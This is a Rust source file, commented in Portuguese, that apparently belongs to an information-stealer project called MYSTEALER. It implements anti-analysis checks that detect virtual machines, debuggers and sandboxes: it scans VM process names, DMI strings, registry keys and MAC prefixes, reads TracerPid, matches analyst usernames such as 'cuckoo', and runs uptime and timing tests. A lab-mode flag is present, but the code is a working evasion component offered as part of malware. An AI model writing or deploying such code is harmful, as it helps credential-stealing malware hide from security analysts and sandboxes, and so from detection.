//! Anti-analysis / Environment checks
//!
//! Detecta VMs, sandboxes, debuggers.
//! No lab mode: verifica que ESTAMOS em ambiente controlado.

use std::process::Command;
use std::path::Path;
use std::time::{Duration, Instant};
use tracing::{info, warn, debug};

pub struct EnvironmentChecker;

impl EnvironmentChecker {
    /// Verifica se estamos em lab environment (VM esperada)
    pub fn verify_lab_environment() -> Result<bool, String> {
        info!("Checking lab environment...");
        
        let mut is_lab = false;
        
        // Check VM indicators
        if Self::is_virtual_machine() {
            info!("[+] VM detected (expected for lab)");
            is_lab = true;
        } else {
            warn!("[-] Not running in VM");
        }
        
        // Check env var
        if std::env::var("MYSTEALER_LAB_MODE").is_ok() {
            info!("[+] MYSTEALER_LAB_MODE set");
            is_lab = true;
        }
        
        // Check marker file
        let markers = ["/tmp/.mystealer_lab", "C:\\Temp\\.mystealer_lab"];
        for m in markers {
            if Path::new(m).exists() {
                info!("[+] Lab marker found: {}", m);
                is_lab = true;
            }
        }
        
        Ok(is_lab)
    }
    
    /// Detecta ambiente virtual (VMware, VBox, QEMU, Hyper-V)
    pub fn is_virtual_machine() -> bool {
        Self::check_vm_processes() ||
        Self::check_dmi_info() ||
        Self::check_vm_registry() ||
        Self::check_mac_address() ||
        Self::check_cpuid()
    }
    
    /// Verifica processos típicos de VM
    fn check_vm_processes() -> bool {
        let vm_procs = [
            "vmtoolsd", "vmwaretray", "vmwareuser", "vmware-vmx",
            "VBoxService", "VBoxTray", "VBoxClient", "virtualbox",
            "qemu-ga", "qemu-system", "spice-vdagent",
            "xe-daemon", "xenservice",
            "vmmemctl", "vmsrvc",
        ];
        
        #[cfg(unix)]
        {
            if let Ok(out) = Command::new("ps").args(["aux"]).output() {
                let ps = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for proc in vm_procs {
                    if ps.contains(proc) {
                        debug!("VM process: {}", proc);
                        return true;
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            if let Ok(out) = Command::new("tasklist").output() {
                let tasks = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for proc in vm_procs {
                    if tasks.contains(proc) {
                        debug!("VM process: {}", proc);
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    /// Verifica DMI/SMBIOS info (Linux)
    fn check_dmi_info() -> bool {
        let dmi_files = [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/board_vendor",
            "/sys/class/dmi/id/bios_vendor",
        ];
        
        let vm_strings = [
            "vmware", "virtualbox", "vbox", "qemu", "kvm",
            "xen", "hyper-v", "microsoft corporation", "virtual",
            "bochs", "parallels", "innotek",
        ];
        
        for path in dmi_files {
            if let Ok(content) = std::fs::read_to_string(path) {
                let lower = content.to_lowercase();
                for s in vm_strings {
                    if lower.contains(s) {
                        debug!("DMI match: {} in {}", s, path);
                        return true;
                    }
                }
            }
        }
        
        // Check /proc/scsi/scsi
        if let Ok(scsi) = std::fs::read_to_string("/proc/scsi/scsi") {
            let lower = scsi.to_lowercase();
            if lower.contains("vmware") || lower.contains("vbox") {
                return true;
            }
        }
        
        false
    }
    
    /// Verifica registry keys (Windows)
    #[cfg(windows)]
    fn check_vm_registry() -> bool {
        let vm_keys = [
            (r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools", "VMware"),
            (r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions", "VBox"),
            (r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest", "VBox"),
            (r"HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters", "Hyper-V"),
        ];
        
        for (key, name) in vm_keys {
            let parts: Vec<&str> = key.splitn(2, '\\').collect();
            if parts.len() == 2 {
                if let Ok(out) = Command::new("reg")
                    .args(["query", key])
                    .output()
                {
                    if out.status.success() {
                        debug!("VM registry key found: {} ({})", key, name);
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    #[cfg(not(windows))]
    fn check_vm_registry() -> bool {
        false
    }
    
    /// Verifica MAC address prefixes de VMs
    fn check_mac_address() -> bool {
        // Prefixos de MAC conhecidos de VMs
        let vm_macs = [
            "00:0c:29", "00:50:56", // VMware
            "08:00:27", "0a:00:27", // VirtualBox
            "52:54:00",             // QEMU/KVM
            "00:16:3e",             // Xen
            "00:1c:42",             // Parallels
            "00:03:ff",             // Hyper-V
        ];
        
        #[cfg(unix)]
        {
            // Tentar ip link
            if let Ok(out) = Command::new("ip").args(["link"]).output() {
                let lower = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for mac in vm_macs {
                    if lower.contains(mac) {
                        debug!("VM MAC prefix: {}", mac);
                        return true;
                    }
                }
            }
            
            // Fallback: /sys/class/net/*/address
            if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
                for entry in entries.flatten() {
                    let addr_path = entry.path().join("address");
                    if let Ok(mac) = std::fs::read_to_string(addr_path) {
                        let mac_lower = mac.trim().to_lowercase();
                        for vm_mac in vm_macs {
                            if mac_lower.starts_with(vm_mac) {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            if let Ok(out) = Command::new("getmac").args(["/fo", "csv"]).output() {
                let lower = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for mac in vm_macs {
                    let mac_no_colon = mac.replace(":", "-");
                    if lower.contains(&mac_no_colon) {
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    /// Verifica via CPUID (hypervisor bit)
    fn check_cpuid() -> bool {
        // CPUID leaf 1, ECX bit 31 = hypervisor present
        // Implementação simplificada via /proc/cpuinfo
        if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
            let lower = cpuinfo.to_lowercase();
            if lower.contains("hypervisor") {
                debug!("Hypervisor flag in cpuinfo");
                return true;
            }
        }
        false
    }
    
    /// Detecta debugger attached
    pub fn is_debugger_present() -> bool {
        #[cfg(unix)]
        {
            // Check TracerPid in /proc/self/status
            if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
                for line in status.lines() {
                    if let Some(pid) = line.strip_prefix("TracerPid:") {
                        let pid = pid.trim();
                        if pid != "0" {
                            info!("Debugger detected: TracerPid={}", pid);
                            return true;
                        }
                    }
                }
            }
            
            // Check ptrace (parent process)
            if let Ok(out) = Command::new("cat").arg("/proc/self/status").output() {
                let status = String::from_utf8_lossy(&out.stdout);
                if status.contains("State:\tt") { // traced/stopped
                    return true;
                }
            }
        }
        
        #[cfg(windows)]
        {
            // IsDebuggerPresent via powershell
            if let Ok(out) = Command::new("powershell")
                .args(["-c", "[System.Diagnostics.Debugger]::IsAttached"])
                .output()
            {
                if String::from_utf8_lossy(&out.stdout).trim().to_lowercase() == "true" {
                    return true;
                }
            }
        }
        
        false
    }
    
    /// Detecta sandbox environment (poucos recursos, usernames típicos)
    pub fn is_sandbox() -> bool {
        // Usernames comuns em sandboxes
        let sandbox_users = [
            "sandbox", "malware", "virus", "sample", "test", 
            "john", "user", "currentuser", "admin", "cuckoo",
            "honey", "analysis", "analyst", "vmuser",
        ];
        
        let user = whoami::username().to_lowercase();
        for su in sandbox_users {
            if user == su || user.contains(su) {
                debug!("Sandbox username: {}", user);
                return true;
            }
        }
        
        // Check process count (sandboxes têm poucos)
        #[cfg(unix)]
        {
            if let Ok(out) = Command::new("ps").args(["aux"]).output() {
                let count = String::from_utf8_lossy(&out.stdout).lines().count();
                if count < 25 {
                    debug!("Low process count: {} (sandbox indicator)", count);
                    return true;
                }
            }
        }
        
        // Check uptime (muito baixo = freshly spawned VM)
        let uptime = sysinfo::System::uptime();
        if uptime < 120 { // menos de 2 minutos
            debug!("Low uptime: {}s (sandbox indicator)", uptime);
            return true;
        }
        
        // Check disk size (sandboxes têm discos pequenos)
        #[cfg(unix)]
        {
            if let Ok(out) = Command::new("df").args(["-h", "/"]).output() {
                let df = String::from_utf8_lossy(&out.stdout);
                // Parse output... se disco < 50GB, suspeito
                if df.contains("G") {
                    // Simplificado
                }
            }
        }
        
        false
    }
    
    /// Timing check - detecta single-stepping/emulation
    pub fn timing_check() -> bool {
        let start = Instant::now();
        
        // Operação que deve ser rápida
        let mut x = 0u64;
        for i in 0..10000 {
            x = x.wrapping_add(i);
        }
        
        let elapsed = start.elapsed();
        
        // Se demorou mais de 100ms, provavelmente emulado/debugado
        if elapsed > Duration::from_millis(100) {
            debug!("Timing anomaly: {:?} (expected <100ms)", elapsed);
            return true;
        }
        
        // Evita otimização
        std::hint::black_box(x);
        
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_env_check() {
        let result = EnvironmentChecker::verify_lab_environment();
        assert!(result.is_ok());
    }
    
    #[test]
    fn test_timing() {
        // Em ambiente normal, deve retornar false
        let is_slow = EnvironmentChecker::timing_check();
        println!("Timing check result: {}", is_slow);
    }
}
